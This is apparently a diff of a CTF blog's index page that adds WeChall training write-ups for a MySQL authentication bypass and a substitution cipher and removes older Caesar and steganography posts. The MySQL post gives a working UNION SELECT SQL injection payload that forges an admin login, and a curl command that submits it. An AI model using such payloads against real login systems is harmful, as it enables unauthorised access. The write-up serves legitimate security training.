@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">257</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,282 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-mysql-ii/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-training-mysql-ii/" class="post-title-link" itemprop="url">WeChall - Training - MySQL II</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-03 14:25:36 / Modified: 14:50:46" itemprop="dateCreated datePublished" datetime="2026-06-03T14:25:36+08:00">2026-06-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-training-mysql-ii/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-mysql-ii/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>MySQL Authentication Bypass II. Same as MySQL I, but with an
+additional password hash check. Your mission: Login yourself as admin.
+MySQL 认证绕过第二版。与 MySQL I 相同，但增加了密码哈希校验。目标：以
+admin 身份登录。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth2_onLogin</span>(<span class="params">WC_Challenge <span class="variable">$chall</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">auth2_db</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);                          <span class="comment"># step A: hash the password</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">queryFirst</span>(<span class="variable">$query</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Auth2&#x27;</span>, <span class="string">&#x27;Unknown user&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">### NEW CHECK ###</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;password&#x27;</span>] !== <span class="variable">$password</span>) &#123;             <span class="comment"># step B: compare hashes</span></span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Auth2&#x27;</span>, <span class="string">&#x27;Wrong password&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$result</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="string">&#x27;admin&#x27;</span>) &#123;   <span class="comment"># step C: award points</span></span><br><span class="line">        <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">onChallengeSolved</span>(<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getUserID</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<h4 id="约束分析">约束分析</h4>
+<p>MySQL I 的 <code>admin' --</code>
+在这里失效了，因为新增的密码校验：</p>
+<ol type="1">
+<li><strong>密码先哈希</strong>：<code>$password = md5($password)</code>
+在查询之前执行，无法通过 SQL 注入绕过</li>
+<li><strong>查询结果校验</strong>：<code>$result['password'] !== $password</code>
+强制查询返回行的 password 列必须等于提交密码的 MD5</li>
+</ol>
+<p>解法思路：既然我们需要控制查询返回的 password 值，用 <strong>UNION
+SELECT</strong> 自己构造一行即可。</p>
+<h4 id="注入点确认">注入点确认</h4>
+<p>username 直接拼接进 SQL，无任何过滤：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&lt;INJECTION&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="列数探测">列数探测</h4>
+<p><code>users</code> 表结构（来自源码注释）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> users (</span><br><span class="line">    userid    <span class="type">INT</span>(<span class="number">11</span>) UNSIGNED AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    username  <span class="type">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    password  <span class="type">CHAR</span>(<span class="number">32</span>) <span class="keyword">CHARACTER SET</span> ascii <span class="keyword">COLLATE</span> ascii_bin <span class="keyword">NOT NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>3 列：<code>userid</code>, <code>username</code>,
+<code>password</code>。</p>
+<h4 id="构造-union-注入">构造 UNION 注入</h4>
+<p>选一个任意密码，计算其 MD5，然后用 UNION SELECT 构造一行包含
+<code>admin</code> + 该 MD5：</p>
+<p><strong>payload 构造过程：</strong></p>
+<ol type="1">
+<li>选密码 <code>x</code> → <code>md5('x')</code> =
+<code>9dd4e461268c8034f5c8564e155c67a6</code></li>
+<li>用户名注入： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT 1,&#x27;admin&#x27;,&#x27;9dd4e461268c8034f5c8564e155c67a6&#x27; --</span><br></pre></td></tr></table></figure></li>
+<li>密码字段填：<code>x</code></li>
+</ol>
+<p>最终 SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;9dd4e461268c8034f5c8564e155c67a6&#x27;</span> <span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>username=''</code> 不匹配任何用户，UNION 的唯一一行就是
+<code>admin</code> + 已知 MD5，完美通过
+<code>$result['password'] !== $password</code> 检查。</p>
+<h4 id="提交">提交</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL <span class="string">&#x27;https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php&#x27;</span> \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;username=&#x27; UNION SELECT 1,&#x27;admin&#x27;,&#x27;9dd4e461268c8034f5c8564e155c67a6&#x27; -- &quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;password=x&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;login=Login&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>返回 <code>Welcome back, admin!</code>，挑战解决。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-substitution-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-training-substitution-1/" class="post-title-link" itemprop="url">WeChall - Training - Substitution I</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-03 14:25:36 / Modified: 14:39:27" itemprop="dateCreated datePublished" datetime="2026-06-03T14:25:36+08:00">2026-06-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-training-substitution-1/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-substitution-1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>A simple monoalphabetic substitution cipher. The plaintext is a fixed
+30-word sentence; only the password word (position 21, 12 letters) is
+dynamic per session. 简单的单表替换密码。明文是一个固定的 30
+词句子，只有第 21 个词（12 个字母）是每 session 动态变化的。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Oh dear, I guess you have cracked the two caesar cryptos...</span><br><span class="line">This one is more difficult. Although a simple substitution is easily cracked...</span><br><span class="line">Again the characters are limited to A-Z... But I think I can come up with a 256 version again.</span><br><span class="line"></span><br><span class="line">Enjoy!</span><br><span class="line">SR ZBC UWJPKBZR KIH RID AUE QCUH ZBPN JR LQPCEH P UJ PJMQCNNCH TCQR YCWW HIEC RIDQ NIWDZPIE GCR PN MEESELIEACIP ZBPN WPZZWC ABUWWCEKC YUN EIZ ZII BUQH YUN PZ</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p>这是一个 <strong>dynamic challenge</strong> —
+每次加载页面都会生成新的密文，但明文句子的结构固定，只有密码词变化。解法是通过
+known-plaintext matching 建立字母映射表。</p>
+<h4 id="步骤-1确定已知词">步骤 1：确定已知词</h4>
+<p>把 30 个密文词列出来，用常见的短英语词来锚定：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 1: SR          2: ZBC         3: UWJPKBZR     4: KIH</span><br><span class="line"> 5: RID         6: AUE         7: QCUH         8: ZBPN</span><br><span class="line"> 9: JR         10: LQPCEH     11: P           12: UJ</span><br><span class="line">13: PJMQCNNCH  14: TCQR       15: YCWW        16: HIEC</span><br><span class="line">17: RIDQ       18: NIWDZPIE   19: GCR         20: PN</span><br><span class="line">21: MEESELIEACIP              22: ZBPN        23: WPZZWC</span><br><span class="line">24: ABUWWCEKC  25: YUN        26: EIZ         27: ZII</span><br><span class="line">28: BUQH       29: YUN        30: PZ</span><br></pre></td></tr></table></figure>
+<p>WeChall Substitution I 的固定部分含有大量可识别的短词：</p>
+<ul>
+<li>第 2 词 <code>ZBC</code> (3 字母) → "the"（英语最常用词）</li>
+<li>第 1 词 <code>SR</code> (2 字母) → "by"（常见介词）</li>
+<li>第 5 词 <code>RID</code> (3 字母) → "you"</li>
+<li>第 6 词 <code>AUE</code> (3 字母) → "can"</li>
+<li>第 27 词 <code>ZII</code> (3 字母, 双写结尾) → "too"（仅有的几个双写
+3 字母词之一）</li>
+<li>第 25/29 词 <code>YUN</code> (3 字母) →
+"was"（在句子中位置吻合）</li>
+</ul>
+<h4 id="步骤-2推导映射">步骤 2：推导映射</h4>
+<p>从第 2 词 <code>ZBC</code> → "the" 开始： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Z → t</span><br><span class="line">B → h</span><br><span class="line">C → e</span><br></pre></td></tr></table></figure></p>
+<p>第 5 词 <code>RID</code> → "you"： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R → y</span><br><span class="line">I → o</span><br><span class="line">D → u</span><br></pre></td></tr></table></figure></p>
+<p>第 27 词 <code>ZII</code> → "too"（Z 已知 → t，II → oo，确认匹配）：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I → o   ✓（与 RID 一致）</span><br></pre></td></tr></table></figure></p>
+<p>第 1 词 <code>SR</code> → "by"： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S → b</span><br><span class="line">R → y   ✓（与 RID 一致）</span><br></pre></td></tr></table></figure></p>
+<p>不断重复——每匹配一个词就扩充映射表。29 个固定词的映射足以覆盖 A-Z
+几乎所有字母。</p>
+<h4 id="步骤-3解码密码词">步骤 3：解码密码词</h4>
+<p>第 21 词 <code>MEESELIEACIP</code>
+是密码词。用已推导的映射逐字母解码即可得到 12 字母密码。</p>
+<p>也可以直接用 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Zra2t2L3N1YnNvbHZl">subsolve<i class="fa fa-external-link-alt"></i></span>
+自动解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./target/release/subsolve <span class="string">&quot;SR ZBC UWJPKBZR KIH RID AUE QCUH ZBPN JR LQPCEH P UJ PJMQCNNCH TCQR YCWW HIEC RIDQ NIWDZPIE GCR PN MEESELIEACIP ZBPN WPZZWC ABUWWCEKC YUN EIZ ZII BUQH YUN PZ&quot;</span></span><br><span class="line">Score: -567.73 (quadgram)</span><br><span class="line">─────────────────────────────────────────────────────────────────</span><br><span class="line">by the almighty god you can <span class="built_in">read</span> this my friend iam impressed very well</span><br><span class="line"><span class="keyword">done</span> your solution key is pn nb nf once oi this little challenge was not</span><br><span class="line">too hard was it</span><br><span class="line">─────────────────────────────────────────────────────────────────</span><br><span class="line">  alt 2 (q: -1549.27): by the almighty god you can <span class="built_in">read</span> this my friend i am impressed very well <span class="keyword">done</span> yo...</span><br><span class="line">  alt 3 (q: -1557.21): by the almighty god you can <span class="built_in">read</span> this my friend iam impressed very well <span class="keyword">done</span> you...</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pnnbnfonceoi</span></span>
+<blockquote>
+<p>此密码为当前 session 动态值，其他 session
+的密码需重新解码。方法不变——known-plaintext matching 或 subsolve tool
+均可。</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1705,226 +1981,6 @@ your password now: XXXXXXXX"</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ct = <span class="string">&quot;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sr...&quot;</span></span><br><span class="line">chars = <span class="built_in">list</span>(ct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(chars) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    chars[i], chars[i+<span class="number">1</span>] = chars[i+<span class="number">1</span>], chars[i]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line"><span class="comment"># result: &quot;Wonderful. You can read the message way better when the letters are in correct order...&quot;</span></span><br></pre></td></tr></table></figure>
 <p>Extract the password after "password now: ".</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">earhpmbmndls</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-caesar-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-caesar-2/" class="post-title-link" itemprop="url">WeChall - Training - Crypto - Caesar II</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-05-27 13:24:42 / Modified: 14:40:50" itemprop="dateCreated datePublished" datetime="2026-05-27T13:24:42+08:00">2026-05-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-caesar-2/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-caesar-2/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>I guess you are done with Caesar I, aren't you? The big problem with
-caesar is that it does not allow digits or other characters. I have
-fixed this, and now I can use any ascii character in the plaintext. The
-keyspace has increased from 26 to 128 too. /</p>
-<p>Enjoy!</p>
-</blockquote>
-<p>Caesar cipher with full ASCII range (0-127). The keyspace has
-increased from 26 to 128.</p>
-<h3 id="solution">Solution</h3>
-<p>The cipher bytes are displayed as hex values. Decode by trying all
-128 shifts:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hex_text=<span class="string">&quot;&quot;&quot;53 7B 7B 70 20 76 7B 6E 38 20 05 7B 01 20 7F 7B</span></span><br><span class="line"><span class="string">78 02 71 70 20 7B 7A 71 20 79 7B 7E 71 20 6F 74</span></span><br><span class="line"><span class="string">6D 78 78 71 7A 73 71 20 75 7A 20 05 7B 01 7E 20</span></span><br><span class="line"><span class="string">76 7B 01 7E 7A 71 05 3A 20 60 74 75 7F 20 7B 7A</span></span><br><span class="line"><span class="string">71 20 03 6D 7F 20 72 6D 75 7E 78 05 20 71 6D 7F</span></span><br><span class="line"><span class="string">05 20 00 7B 20 6F 7E 6D 6F 77 3A 20 63 6D 7F 7A</span></span><br><span class="line"><span class="string">33 00 20 75 00 4B 20 3D 3E 44 20 77 71 05 7F 20</span></span><br><span class="line"><span class="string">75 7F 20 6D 20 7D 01 75 00 71 20 7F 79 6D 78 78</span></span><br><span class="line"><span class="string">20 77 71 05 7F 7C 6D 6F 71 38 20 7F 7B 20 75 00</span></span><br><span class="line"><span class="string">20 7F 74 7B 01 78 70 7A 33 00 20 74 6D 02 71 20</span></span><br><span class="line"><span class="string">00 6D 77 71 7A 20 05 7B 01 20 00 7B 7B 20 78 7B</span></span><br><span class="line"><span class="string">7A 73 20 00 7B 20 70 71 6F 7E 05 7C 00 20 00 74</span></span><br><span class="line"><span class="string">75 7F 20 79 71 7F 7F 6D 73 71 3A 20 63 71 78 78</span></span><br><span class="line"><span class="string">20 70 7B 7A 71 38 20 05 7B 01 7E 20 7F 7B 78 01</span></span><br><span class="line"><span class="string">00 75 7B 7A 20 75 7F 20 6F 7E 73 6D 6E 7C 7F 7B</span></span><br><span class="line"><span class="string">6D 7C 73 79 3A&quot;&quot;&quot;</span></span><br><span class="line">ct_bytes = [<span class="built_in">int</span>(x, <span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hex_text.split()]</span><br><span class="line"><span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    decoded = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>((b - K) % <span class="number">128</span>) <span class="keyword">for</span> b <span class="keyword">in</span> ct_bytes)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is&#x27;</span> <span class="keyword">in</span> decoded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;K=<span class="subst">&#123;K&#125;</span>: <span class="subst">&#123;decoded&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>The space character (0x20) is part of the shift and will appear as a
-different character after decoding. Replace the most frequent non-alpha
-character with space to read the message.</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">crgabpsoapgm</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-stegano-i/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-training-stegano-i/" class="post-title-link" itemprop="url">WeChall - Training - Stegano I</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-05-26 16:30:00" itemprop="dateCreated datePublished" datetime="2026-05-26T16:30:00+08:00">2026-05-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-05-27 10:32:11" itemprop="dateModified" datetime="2026-05-27T10:32:11+08:00">2026-05-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-training-stegano-i/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-stegano-i/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>A 4×4 pixel BMP image with hidden data. The challenge title says
-"This is the most basic image stegano I can think of."</p>
-<h3 id="solution">Solution</h3>
-<p>Download the BMP file and read the pixel data directly — the message
-is stored as plaintext in the pixel bytes, not hidden with LSB
-steganography.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -O https://www.wechall.net/en/challenge/training/stegano1/stegano1.bmp</span><br><span class="line">$ xxd stegano1.bmp | <span class="built_in">head</span> -5</span><br></pre></td></tr></table></figure>
